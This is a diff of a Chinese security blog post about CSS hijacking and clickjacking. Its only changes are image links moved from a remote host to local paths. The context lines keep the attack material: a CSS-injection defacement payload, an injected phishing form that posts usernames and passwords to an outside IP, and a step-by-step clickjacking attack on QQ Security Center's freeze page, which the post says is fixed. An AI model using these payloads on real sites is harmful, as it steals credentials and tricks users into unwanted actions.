@@ -24,7 +24,7 @@ ClickJacking背景说明:
 <table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>hacked by key</h1></td></tr></tbody></table>
 ```
 
-![CSS jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x00.png)
+![CSS jacking](/images/2017-12-20/0x00.png)
 
 除了可以炫技，CSS劫持可以做的东西也有很多：例如经典的form表单钓鱼攻击
 
@@ -32,7 +32,7 @@ ClickJacking背景说明:
 <table+style="left:+0px;+top:+0px;+position:+fixed;z-index:+5000;position:absolute;width:100%;background-color:white;"><tr><td><form action="http://192.168.0.109/login.php" method="post">账号：<input type="text" name="name"><br>密码：<input type="password" name="pwd"><br><input type="submit" value="登陆"></form><td></tr></table>
 ```
 
-![CSS jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x01.png)
+![CSS jacking](/images/2017-12-20/0x01.png)
 
 这里就不对代码的意思进行解读了，可以看到CSS劫持达到的视觉欺骗攻击效果还是比较LOW的，因为这样的攻击手段偏被动式。而我要说的点击劫持其实也算是被动式，不过相对来说比较容易获得信任让被动式触发，这里只是单单对攻击手法谁的成功率比较高作为比较
 
@@ -40,7 +40,7 @@ ClickJacking背景说明:
 
 这里以QQ安全中心的一个点击劫持为例，作为一个QQ的资深用户应该知道QQ是有安全中心紧急冻结QQ服务的，只要登录自己的安全中心就可以冻结，**地址(漏洞地址，目前漏洞已经修复)**为：<https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985>
 
-![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x02.png)
+![QQ Click Jacking](/images/2017-12-20/0x02.png)
 
 一点击，你的QQ就被会冻结(当时不知道逗了多少人~)，那这样怎么利用呢？
 
@@ -72,7 +72,7 @@ ClickJacking背景说明:
 
 大小直接通过审查元素可以看得到:
 
-![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x03.png)
+![QQ Click Jacking](/images/2017-12-20/0x03.png)
 
 现在要获取的就是按钮元素到浏览器顶部的距离，这里通过`id.offsetTop`有些时候是无法直接获取的:
 
@@ -85,7 +85,7 @@ ClickJacking背景说明:
 document.getElementById('span_verify').getBoundingClientRect().top
 ```
 
-![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x04.png)
+![QQ Click Jacking](/images/2017-12-20/0x04.png)
 4.建立按钮:
 
 ```html
@@ -108,8 +108,8 @@ document.getElementById('span_verify').getBoundingClientRect().top
 ```
 
 6.散播，用户中招:
-![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x05.png)
-![QQ Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x06.png)
+![QQ Click Jacking](/images/2017-12-20/0x05.png)
+![QQ Click Jacking](/images/2017-12-20/0x06.png)
 
 ## 一次点击劫持攻击案例
 
@@ -123,7 +123,7 @@ document.getElementById('span_verify').getBoundingClientRect().top
 
 **形成的攻击思路->iframe嵌套漏洞URL链接->Click Jacking攻击页面构造->通过留言给管理员引诱触发**
 
-![Click Jacking](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2017-12-20/0x07.png)
+![Click Jacking](/images/2017-12-20/0x07.png)
 
 攻击页面构造流程其实耐心读到这里的朋友已经是非常明确步骤了:
 
